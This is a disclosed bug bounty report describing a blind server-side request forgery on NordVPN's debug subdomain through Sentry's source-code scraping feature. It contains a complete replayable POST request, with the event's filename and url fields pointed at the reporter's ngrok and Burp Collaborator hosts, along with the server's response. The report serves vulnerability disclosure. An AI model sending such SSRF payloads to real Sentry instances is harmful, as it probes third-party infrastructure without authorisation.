# Blind SSRF on debug.nordvpn.com due to misconfigured sentry instance

## Report Details
- **Report ID**: 756149
- **URL**: https://hackerone.com/reports/756149
- **State**: Closed
- **Severity**: low
- **Submitted**: 2019-12-11T13:43:32.029Z
- **Disclosed**: 2020-02-24T10:59:56.642Z

## Reporter
- **Username**: mase289
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nordsecurity

## Vulnerability Information
## Summary:
The debug subdomain uses Sentry for application monitoring and error tracking.  This software comes with a feature (known as source code scraping ) turned on by default which makes it is possible to make blind get requests from the server on which it is running.

## Steps To Reproduce:
[add details for how we can reproduce the issue]
You can reproduce this using burpsuite  or any preferred proxy software

  1. Make a POST request to the relevant endpoint  
`/api/4/store/?sentry_version=7&sentry_client=raven-js%2F3.27.1&sentry_key=48819d1178934516beea3f05a9e1ceed`

```
POST /api/4/store/?sentry_version=7&sentry_client=raven-js%2F3.27.1&sentry_key=48819d1178934516beea3f05a9e1ceed HTTP/1.1
Host: debug.nordvpn.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://join.nordvpn.com/
Content-Type: text/plain;charset=UTF-8
Origin: https://join.nordvpn.com
Content-Length: 9699
Connection: close

{"project":"4","logger":"javascript","platform":"javascript","request":{"headers":{"User-Agent":"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0","Referer":"https://nwnzekunqxlyy3bux0v2buzbx23srh.burpcollaborator.net/features/"},"url":"http://2661b367.ngrok.io/?_ga=2.45523556.192632961.1576059112-1770582595.1576059112"},"exception":{"values":[{"type":"Error","value":"","stacktrace":{"frames":[{"filename":"http://2661b367.ngrok.io/web/floating-widget.js?account=nordvpn","lineno":1,"colno":437441,"function":"o/</o.onabort","in_app":true}]}}],"mechanism":{"type":"onunhandledrejection","handled":false}},"transaction":"https://"http://2661b367.ngrok.io/web/floating-widget.js?account=nordvpn","trimHeadFrames":0,"tags":{"app.version":"1.169.0"},"extra":{"state":{"nord.redux-api":{"GET/servers/count":{"fetching":false,"fetched":true,"error":true,"timestamp":1576059820513,"successPayload":null,"errorPayload":{"stack":"n@"http://2661b367.ngrok.io/assets/js/app-bundle-474689.js:55:45308\nt@"http://2661b367.ngrok.io/assets/js/app-bundle-474689.js:55:52883\no/<@"http://2661b367.ngrok.io/assets/js/app-bundle-474689.js:55:72027\nS@https://join.nordvpn.com/assets/js/app-bundle-474689.js:55:79113\nw/a._invoke</<@https://join.nordvpn.com/assets/js/app-bundle-474689.js:55:78902\nT/</e[t]@https://join.nordvpn.com/assets/js/app-bundle-474689.js:55:79292\nn@https://join.nordvpn.com/assets/js/app-bundle-474689.js:55:43276\ns@https://join.nordvpn.com/assets/js/app-bundle-474689.js:55:43515\n","message":"NetworkError when attempting to fetch resource.","name":"RequestError"}},"GET/users/plans":{"fetching":false,"fetched":true,"error":true,"timestamp":1576059820460,"successPayload":null,"errorPayload":{"stack":"n@https://join.nordvpn.com/assets/js/app-bundle-474689.js:55:45308\nt@https://join.nordvpn.com/assets/js/app-bundle-474689.js:55:52883\no/<@https://join.nordvpn.com/assets/js/app-bundle-474689.js:55:72027\nS@https://join.nordvpn.com/assets/js/app-bundle-474689.js:55:79113\nw/a._invoke</<@https://join.nordvpn.com/assets/js/app-bundle-474689.js:55:78902\nT/</e[t]@https://join.nordvpn.com/assets/js/app-bundle-474689.js:55:79292\nn@https://join.nordvpn.com/assets/js/app-bundle-474689.js:55:43276\ns@https://join.nordvpn.com/assets/js/app-bundle-474689.js:55:43515\n","message":"NetworkError when attempting to fetch resource.","name":"RequestError"}},"GET/payments/providers":{"fetching":false,"fetched":true,"error":true,"timestamp":1576059820451,"successPayload":null,"errorPayload":{"stack":"d@https://join.nordvpn.com/assets/js/app-bundle-474689.js:55:44945\nn@https://join.nordvpn.com/assets/js/app-bundle-474689.js:55:45308\nt@https://join.nordvpn.com/assets/js/app-bundle-474689.js:55:52883\no/<@https://join.nordvpn.com/assets/js/app-bundle-474689.js:55:72027\nS@https://join.nordvpn.com/assets/js/app-bundle-474689.js:55:79113\nw/a._invoke</<@https://join.nordvpn.com/assets/js/app-bundle-474689.js:55:78902\nT/</e[t]@https://join.nordvpn.com/assets/js/app-bundle-474689.js:55:79292\nn@https://join.nordvpn.com/assets/js/app-bundle-474689.js:55:43276\ns@https://join.nordvpn.com/assets/js/app-bundle-474689.js:55:43515\n","message":"NetworkError when attempting to fetch resource.","name":"RequestError"}}},"nordvpn.alert":{"queue":[]},"nordvpn.cached-api":{},"nordvpn.router-session":{"history":["/order/"]},"nordvpn.account":{"create":{"fetching":false,"email":null,"error":null,"account":null,"isStale":false},"createForm":{"errors":{}},"validation":{"fetching":false,"existing":false},"setPassword":{"fetching":false,"error":null}},"order.countdown":{"timestamp":1576059803753},"nordvpn.currency":{"currencyCode":"USD"},"router":{"location":{"pathname":"/order/","search":"?_ga=2.45523556.192632961.1576059112-1770582595.1576059112","hash":""},"action":"POP"},"nordvpn.order":{"selectedPlanId":null,"queryPlan":null,"orderId":null,"inputCache":null,"orderSubmitData":null,"dealCouponCode":null,"planInstallment":false},"nordvpn.order.taxes":{"selectedTaxCode":null},"nordvpn.order.payment-providers":{"selectedProviderId":null,"enableFallbackPaymentProviders":false},"nordvpn.order.coupons":{"activatedCouponCode":null,"couponAutoSetTimestamp":null},"_persist":{"version":-1,"rehydrated":true}},"session:duration":17577},"breadcrumbs":{"values":[{"timestamp":1576059803.193,"category":"redux-action","message":"persist/PERSIST"},{"timestamp":1576059803.236,"category":"redux-action","message":"persist/REHYDRATE"},{"timestamp":1576059803.244,"category":"redux-action"},{"timestamp":1576059803.244,"category":"redux-action","message":"nordvpn.order.INVALIDATE"},{"timestamp":1576059803.245,"category":"redux-action"},{"timestamp":1576059803.246,"category":"redux-action","message":"nordvpn.order.payment-providers.INVALIDATE"},{"timestamp":1576059803.246,"category":"redux-action","message":"nord.redux-api.INVALIDATE"},{"timestamp":1576059803.247,"category":"redux-action","message":"nord.redux-api.INVALIDATE"},{"timestamp":1576059803.25,"category":"redux-action","message":"nordvpn.order.coupons.INVALIDATE"},{"timestamp":1576059803.25,"category":"redux-action","message":"nord.redux-api.INVALIDATE"},{"timestamp":1576059803.251,"category":"redux-action","message":"nord.redux-api.INVALIDATE"},{"timestamp":1576059803.252,"category":"redux-action","message":"nordvpn.account.INVALIDATE"},{"timestamp":1576059803.253,"category":"redux-action","message":"nordvpn.currency.INVALIDATE"},{"timestamp":1576059803.256,"category":"redux-action","message":"nord.redux-api.NORMALIZE"},{"timestamp":1576059803.256,"category":"redux-action","message":"nordvpn.cached-api.NORMALIZE"},{"timestamp":1576059803.257,"category":"redux-action","message":"nordvpn.account.NORMALIZE"},{"timestamp":1576059803.258,"category":"redux-action"},{"timestamp":1576059803.259,"category":"redux-action","message":"nordvpn.order.NORMALIZE"},{"timestamp":1576059803.282,"category":"redux-action","message":"@@router/LOCATION_CHANGE"},{"timestamp":1576059803.284,"category":"redux-action"},{"timestamp":1576059803.284,"category":"redux-action","message":"nordvpn.order.INVALIDATE"},{"timestamp":1576059803.285,"category":"redux-action"},{"timestamp":1576059803.285,"category":"redux-action","message":"nordvpn.order.payment-providers.INVALIDATE"},{"timestamp":1576059803.286,"category":"redux-action","message":"nord.redux-api.INVALIDATE"},{"timestamp":1576059803.286,"category":"redux-action","message":"nord.redux-api.INVALIDATE"},{"timestamp":1576059803.288,"category":"redux-action","message":"nordvpn.order.coupons.INVALIDATE"},{"timestamp":1576059803.288,"category":"redux-action","message":"nord.redux-api.INVALIDATE"},{"timestamp":1576059803.288,"category":"redux-action","message":"nord.redux-api.INVALIDATE"},{"timestamp":1576059803.289,"category":"redux-action","message":"nordvpn.account.INVALIDATE"},{"timestamp":1576059803.289,"category":"redux-action","message":"nordvpn.currency.INVALIDATE"},{"timestamp":1576059803.29,"category":"redux-action","message":"nordvpn.router-session.ADD_SESSION_HISTORY"},{"timestamp":1576059803.555,"category":"redux-action","message":"nordvpn.account.SET_ACCOUNT_FORM_ERROR"},{"timestamp":1576059803.751,"category":"redux-action","message":"order.countdown.SET_INITIALIZATION_TIMESTAMP"},{"timestamp":1576059803.757,"category":"redux-action"},{"timestamp":1576059803.759,"category":"redux-action"},{"timestamp":1576059803.76,"category":"redux-action"},{"timestamp":1576059803.762,"category":"redux-action"},{"timestamp":1576059803.774,"category":"redux-action"},{"timestamp":1576059803.774,"category":"redux-action"},{"timestamp":1576059803.983,"category":"redux-action","message":"nordvpn.currency.SET_CURRENCY_CODE"},{"timestamp":1576059804.004,"category":"redux-action","message":"nordvpn.account.SET_ACCOUNT_FORM_ERROR"},{"timestamp":1576059804.012,"category":"redux-action"},{"timestamp":1576059804.012,"category":"redux-action"},{"timestamp":1576059804.013,"category":"redux-action"},{"timestamp":1576059808.03,"type":"http","category":"xhr","data":{"method":"GET","url":"https://s1.nordcdn.com/nordvpn/media/1.254.0/images/global/icons/24/present.svg","status_code":200}},{"timestamp":1576059808.605,"type":"http","category":"xhr","data":{"method":"GET","url":"https://s1.nordcdn.com/nordvpn/media/1.254.0/images/global/icons/16/tick.svg","status_code":200}},{"timestamp":1576059808.684,"type":"http","category":"xhr","data":{"method":"GET","url":"https://s1.nordcdn.com/nordvpn/media/1.254.0/images/global/icons/16/facebook.svg","status_code":200}},{"timestamp":1576059812.507,"type":"http","category":"xhr","data":{"method":"GET","url":"https://s1.nordcdn.com/nordvpn/media/1.254.0/images/global/icons/16/youtube.svg","status_code":200}},{"timestamp":1576059820.452,"category":"redux-action"},{"timestamp":1576059820.454,"type":"http","category":"xhr","data":{"method":"GET","url":"https://s1.nordcdn.com/nordvpn/media/1.254.0/images/global/icons/16/instagram.svg","status_code":0}},{"timestamp":1576059820.486,"category":"redux-action"},{"timestamp":1576059820.487,"category":"redux-action"},{"timestamp":1576059820.515,"type":"http","category":"xhr","data":{"method":"GET","url":"https://s1.nordcdn.com/nordvpn/media/1.254.0/images/global/icons/16/twitter.svg","status_code":0}},{"timestamp":1576059820.516,"type":"http","category":"xhr","data":{"method":"GET","url":"https://nordvpn.nanorep.co/~nordvpn/api/widget/v1/faqs?format=json&widgetType=float&account=nordvpn&configId=1047377312&referer=https%3A%2F%2Fjoin.nordvpn.com%2Forder%2F%3F_ga%3D2.45523556.192632961.1576059112-1770582595.1576059112","status_code":0}}]},"environment":"production","release":"3.880.2","event_id":"5b2bf4c8d5d548538752ff62652f5429"}
```
Notice that in the above step, i have replaced the sentry "filename parameter:" with a link to my proxy tunneler http://2661b367.ngrok.io. You should replace this with a server ip under your control.

The above results in the following response:
```
HTTP/1.1 200 OK
Date: Wed, 11 Dec 2019 12:41:08 GMT
Content-Type: application/json
Content-Length: 41
Connection: close
Set-Cookie: __cfduid=d4478cc16398e2ec3b04e050b4e8770451576068068; expires=Fri, 10-Jan-20 12:41:08 GMT; path=/; domain=.nordvpn.com; HttpOnly
Access-Control-Allow-Methods: GET, POST, HEAD, OPTIONS
X-Content-Type-Options: nosniff
Content-Language: en
Access-Control-Expose-Headers: X-Sentry-Error, Retry-After
Expires: Wed, 11 Dec 2019 12:41:08 GMT
Vary: Accept-Language, Cookie
Last-Modified: Wed, 11 Dec 2019 12:41:08 GMT
X-XSS-Protection: 1; mode=block
Cache-Control: max-age=0
Access-Control-Allow-Origin: https://join.nordvpn.com
Access-Control-Allow-Headers: X-Sentry-Auth, X-Requested-With, Origin, Accept, Content-Type, Authentication
X-Frame-Options: deny
Accept-Ranges: bytes
CF-Cache-Status: DYNAMIC
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
Expect-CT: max-age=604800, report-uri="https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct"
Server: cloudflare
CF-RAY: 543787f39acecb87-MBA

{"id":"5b2bf4c8d5d548538752ff62652f5429"}
```
And a GET request as the server attempts to fetch resources from the tunneler. See attached images. 

  2.  Check your server logs for outbound get requests. 

## Supporting Material/References:
[list any additional material (e.g. screenshots, logs, etc.)]


  * [attachment / reference]
https://hackerone.com/reports/374737
https://blog.sentry.io/2018/07/17/source-code-fetching
Request-Response.png
Callback.png
Ngrok_callbacks.png

## Impact

Blind Server Side Request Forgery from debug.nordvpn.com

## Attachments
No attachments
